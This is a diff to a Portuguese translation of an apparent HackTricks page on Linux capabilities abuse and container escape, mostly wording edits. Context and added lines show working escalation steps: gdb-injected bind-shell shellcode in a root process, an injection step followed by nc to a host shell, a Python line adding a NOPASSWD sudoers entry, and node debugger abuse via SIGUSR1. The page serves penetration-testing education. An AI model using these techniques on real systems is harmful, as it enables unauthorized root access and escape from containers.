@@ -187,7 +187,7 @@ cap_net_admin,cap_net_raw    jrnetadmin
 # Combining names and numerics
 cap_sys_admin,22,25          jrsysadmin
 ```
-## Capabilidades de Ambiente
+## Capacidades do Ambiente
 
 Compilando o seguinte programa, é possível **gerar um shell bash dentro de um ambiente que fornece capacidades**.
 
@@ -309,7 +309,7 @@ Portanto, um arquivo de **configuração de serviço** permite **especificar** a
 User=bob
 AmbientCapabilities=CAP_NET_BIND_SERVICE
 ```
-## Capabilities in Docker Containers
+## Capacidades em Contêineres Docker
 
 Por padrão, o Docker atribui algumas capacidades aos contêineres. É muito fácil verificar quais são essas capacidades executando:
 ```bash
@@ -328,15 +328,15 @@ docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained 
 ```
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervente para profissionais de tecnologia e cibersegurança em todas as disciplinas.
+​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.
 
 {% embed url="https://www.rootedcon.com/" %}
 
-## Privesc/Escape de Container
+## Privesc/Container Escape
 
-As capacidades são úteis quando você **quer restringir seus próprios processos após realizar operações privilegiadas** (por exemplo, após configurar chroot e vincular a um socket). No entanto, elas podem ser exploradas passando comandos ou argumentos maliciosos que são então executados como root.
+As capacidades são úteis quando você **quer restringir seus próprios processos após realizar operações privilegiadas** (por exemplo, após configurar chroot e vincular a um socket). No entanto, elas podem ser exploradas ao passar comandos ou argumentos maliciosos que são então executados como root.
 
-Você pode forçar capacidades em programas usando `setcap`, e consultar essas usando `getcap`:
+Você pode forçar capacidades em programas usando `setcap` e consultar essas usando `getcap`:
 ```bash
 #Set Capability
 setcap cap_net_raw+ep /sbin/ping
@@ -353,7 +353,7 @@ getcap -r / 2>/dev/null
 ```
 ### Exemplo de exploração
 
-No seguinte exemplo, o binário `/usr/bin/python2.6` é encontrado vulnerável a privesc:
+No exemplo a seguir, o binário `/usr/bin/python2.6` é encontrado vulnerável a privesc:
 ```bash
 setcap cap_setuid+ep /usr/bin/python2.7
 /usr/bin/python2.7 = cap_setuid+ep
@@ -572,7 +572,7 @@ buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
 buf += b"\x0f\x05"
 
 # Divisible by 8
-payload = b"\x90" * (8 - len(buf) % 8 ) + buf
+payload = b"\x90" * (-len(buf) % 8) + buf
 
 # Change endianess and print gdb lines to load the shellcode in RIP directly
 for i in range(0, len(buf), 8):
@@ -585,21 +585,23 @@ print(f"set {{long}}($rip+{i}) = {chunks}")
 ```
 Depure um processo root com gdb e copie e cole as linhas gdb geradas anteriormente:
 ```bash
+# Let's write the commands to a file
+echo 'set {long}($rip+0) = 0x296a909090909090
+set {long}($rip+8) = 0x5e016a5f026a9958
+set {long}($rip+16) = 0x0002b9489748050f
+set {long}($rip+24) = 0x48510b0e0a0a2923
+set {long}($rip+32) = 0x582a6a5a106ae689
+set {long}($rip+40) = 0xceff485e036a050f
+set {long}($rip+48) = 0x6af675050f58216a
+set {long}($rip+56) = 0x69622fbb4899583b
+set {long}($rip+64) = 0x8948530068732f6e
+set {long}($rip+72) = 0x050fe689485752e7
+c' > commands.gdb
 # In this case there was a sleep run by root
 ## NOTE that the process you abuse will die after the shellcode
 /usr/bin/gdb -p $(pgrep sleep)
 [...]
-(gdb) set {long}($rip+0) = 0x296a909090909090
-(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
-(gdb) set {long}($rip+16) = 0x0002b9489748050f
-(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
-(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
-(gdb) set {long}($rip+40) = 0xceff485e036a050f
-(gdb) set {long}($rip+48) = 0x6af675050f58216a
-(gdb) set {long}($rip+56) = 0x69622fbb4899583b
-(gdb) set {long}($rip+64) = 0x8948530068732f6e
-(gdb) set {long}($rip+72) = 0x050fe689485752e7
-(gdb) c
+(gdb) source commands.gdb
 Continuing.
 process 207009 is executing new program: /usr/bin/dash
 [...]
@@ -640,7 +642,7 @@ Liste **processos** em execução no **host** `ps -eaf`
 2. Encontre um **shellcode** para a arquitetura ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
 3. Encontre um **programa** para **injetar** o **shellcode** na memória de um processo ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
 4. **Modifique** o **shellcode** dentro do programa e **compile**-o `gcc inject.c -o inject`
-5. **Injete** e pegue seu **shell**: `./inject 299; nc 172.17.0.1 5600`
+5. **Injete** e capture seu **shell**: `./inject 299; nc 172.17.0.1 5600`
 
 ## CAP\_SYS\_MODULE
 
@@ -989,7 +991,7 @@ vim /etc/sudoers #To overwrite it
 ```
 **Exemplo com binário 2**
 
-Neste exemplo, o binário **`python`** terá esta capacidade. Você pode usar o python para sobrescrever qualquer arquivo:
+Neste exemplo, o binário **`python`** terá esta capacidade. Você poderia usar o python para sobrescrever qualquer arquivo:
 ```python
 file=open("/etc/sudoers","a")
 file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
@@ -1322,7 +1324,7 @@ os.killpg(pgid, signal.SIGKILL)
 ```
 **Privesc com kill**
 
-Se você tiver capacidades de kill e houver um **programa node rodando como root** (ou como um usuário diferente), você provavelmente poderia **enviar** o **sinal SIGUSR1** e fazer com que ele **abra o depurador do node** para onde você pode se conectar.
+Se você tiver capacidades de kill e houver um **programa node rodando como root** (ou como um usuário diferente), você provavelmente poderia **enviar** o **sinal SIGUSR1** e fazer com que ele **abra o depurador node** para onde você pode se conectar.
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
@@ -1345,7 +1347,7 @@ kill -s SIGUSR1 <nodejs-ps>
 
 **Exemplo com binário**
 
-Se **`python`** tiver essa capacidade, ele poderá escutar em qualquer porta e até se conectar a partir dela a qualquer outra porta (alguns serviços exigem conexões de portas privilegiadas específicas)
+Se **`python`** tiver essa capacidade, ele poderá escutar em qualquer porta e até se conectar a partir dela a qualquer outra porta (alguns serviços exigem conexões de portas com privilégios específicos)
 
 {% tabs %}
 {% tab title="Listen" %}
@@ -1496,7 +1498,7 @@ sudo chattr -i file.txt
 
 ## CAP\_SYS\_BOOT
 
-[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) não apenas permite a execução da chamada de sistema `reboot(2)` para reinicializações do sistema, incluindo comandos específicos como `LINUX_REBOOT_CMD_RESTART2` adaptados para certas plataformas de hardware, mas também habilita o uso de `kexec_load(2)` e, a partir do Linux 3.17, `kexec_file_load(2)` para carregar novos ou assinados kernels de falha, respectivamente.
+[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) não apenas permite a execução da chamada de sistema `reboot(2)` para reinicializações do sistema, incluindo comandos específicos como `LINUX_REBOOT_CMD_RESTART2` adaptados para certas plataformas de hardware, mas também possibilita o uso de `kexec_load(2)` e, a partir do Linux 3.17, `kexec_file_load(2)` para carregar novos ou assinados kernels de falha, respectivamente.
 
 ## CAP\_SYSLOG
 
@@ -1515,7 +1517,7 @@ Essa capacidade é essencial para processos que requerem a habilidade de criar a
 
 É uma capacidade padrão do docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).
 
-Essa capacidade permite realizar escalonamentos de privilégios (através de leitura completa do disco) no host, sob estas condições:
+Essa capacidade permite realizar escalonamentos de privilégios (através da leitura completa do disco) no host, sob estas condições:
 
 1. Ter acesso inicial ao host (sem privilégios).
 2. Ter acesso inicial ao contêiner (privilegiado (EUID 0) e efetivo `CAP_MKNOD`).
